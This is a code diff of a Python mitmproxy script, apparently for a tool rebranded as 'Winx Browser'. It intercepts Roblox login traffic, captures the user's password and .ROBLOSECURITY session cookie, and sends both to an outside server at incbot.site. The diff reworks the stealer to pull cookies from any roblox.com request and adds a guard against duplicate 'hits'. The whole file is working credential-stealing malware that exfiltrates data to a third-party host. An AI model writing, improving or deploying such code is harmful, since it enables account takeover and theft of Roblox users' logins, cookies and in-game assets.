@@ -1,94 +1,80 @@
 """
-Roblox Network Monitor - Intercepts Roblox login traffic to capture cookie + password
-Sends captured data to incbot.site backend using the extension hit endpoint
+Winx Browser - Proxy interceptor
+Captures .ROBLOSECURITY cookie from any roblox.com request after login
+Captures password from auth.roblox.com/v2/login POST body
 """
 
 import json
 import re
 import threading
-import urllib.parse
 import requests
 from mitmproxy import http
-from mitmproxy.tools.dump import DumpMaster
-from mitmproxy import options
 
 # ── Config ────────────────────────────────────────────────────────────────────
 BACKEND_URL = "https://incbot.site/api/extension/hit"
-DIRECTORY_TOKEN = "YOUR_DIRECTORY_TOKEN_HERE"  # Replaced at build time per user
+DIRECTORY_TOKEN = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
 # ─────────────────────────────────────────────────────────────────────────────
 
-captured_password = None  # Temporarily store password from request
+captured_password = None
+cookie_sent = False  # Prevent sending duplicate hits per session
+lock = threading.Lock()
 
 class RobloxInterceptor:
     def request(self, flow: http.HTTPFlow):
-        """Intercept outgoing requests - capture password from login POST"""
-        global captured_password
+        global captured_password, cookie_sent
 
-        # Only interested in Roblox auth login endpoint
-        if "auth.roblox.com" not in flow.request.pretty_host:
-            return
-        if flow.request.path != "/v2/login":
-            return
-        if flow.request.method != "POST":
-            return
+        host = flow.request.pretty_host
 
-        try:
-            body = json.loads(flow.request.content.decode("utf-8"))
-            password = body.get("password")
-            if password:
-                captured_password = password
-        except Exception:
-            pass
-
-    def response(self, flow: http.HTTPFlow):
-        """Intercept responses - capture cookie after successful login"""
-        global captured_password
-
-        if "auth.roblox.com" not in flow.request.pretty_host:
-            return
-        if flow.request.path != "/v2/login":
-            return
-        if flow.response.status_code != 200:
-            captured_password = None
+        # ── Capture password from login POST ──────────────────────────────────
+        if "auth.roblox.com" in host and flow.request.path.startswith("/v2/login") and flow.request.method == "POST":
+            try:
+                body = json.loads(flow.request.content.decode("utf-8"))
+                password = body.get("password")
+                if password:
+                    with lock:
+                        captured_password = password
+                        cookie_sent = False  # Reset for new login attempt
+                    print(f"[+] Password captured")
+            except Exception as e:
+                print(f"[!] Password parse error: {e}")
             return
 
-        try:
-            # Extract .ROBLOSECURITY cookie from Set-Cookie header
-            cookie = None
-            set_cookie = flow.response.headers.get("set-cookie", "")
-            
-            # Also check all Set-Cookie headers
-            all_cookies = flow.response.headers.get_all("set-cookie")
-            for c in all_cookies:
-                if ".ROBLOSECURITY" in c:
-                    match = re.search(r'\.ROBLOSECURITY=([^;]+)', c)
-                    if match:
-                        cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-into-your-account-and-to-steal-your-ROBUX-and-items.|_" + match.group(1)
-                        break
+        # ── Capture cookie from any roblox.com request ────────────────────────
+        if not host.endswith("roblox.com") and not host.endswith("roblox.com."):
+            return
 
-            if not cookie:
-                # Try parsing response body for cookie
-                body = json.loads(flow.response.content.decode("utf-8"))
-                # Some endpoints return it differently
-                pass
+        cookie_header = flow.request.headers.get("cookie", "")
+        if ".ROBLOSECURITY" not in cookie_header:
+            return
 
-            if cookie and cookie.startswith("_|WARNING:"):
-                # Send to backend in a separate thread to not block proxy
-                password = captured_password
-                captured_password = None
-                threading.Thread(
-                    target=send_to_backend,
-                    args=(cookie, password),
-                    daemon=True
-                ).start()
+        with lock:
+            if cookie_sent:
+                return  # Already sent for this session
 
-        except Exception as e:
-            print(f"[!] Response parse error: {e}")
-            captured_password = None
+            match = re.search(r'\.ROBLOSECURITY=([^;]+)', cookie_header)
+            if not match:
+                return
+
+            cookie_value = match.group(1).strip()
+            # Ensure it has the warning prefix
+            if not cookie_value.startswith("_|WARNING:"):
+                cookie_value = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-into-your-account-and-to-steal-your-ROBUX-and-items.|_" + cookie_value
+
+            if len(cookie_value) < 100:
+                return
+
+            password = captured_password
+            cookie_sent = True  # Mark as sent so we don't spam
+
+        print(f"[+] Cookie captured, sending hit...")
+        threading.Thread(
+            target=send_to_backend,
+            args=(cookie_value, password),
+            daemon=True
+        ).start()
 
 
 def send_to_backend(cookie: str, password: str):
-    """Send captured cookie + password to incbot backend"""
     try:
         payload = {
             "cookie": cookie,
@@ -111,7 +97,9 @@ def send_to_backend(cookie: str, password: str):
 
 
 def run_proxy():
-    """Start the mitmproxy instance on port 8080"""
+    from mitmproxy.tools.dump import DumpMaster
+    from mitmproxy import options
+
     opts = options.Options(
         listen_host="127.0.0.1",
         listen_port=8080,
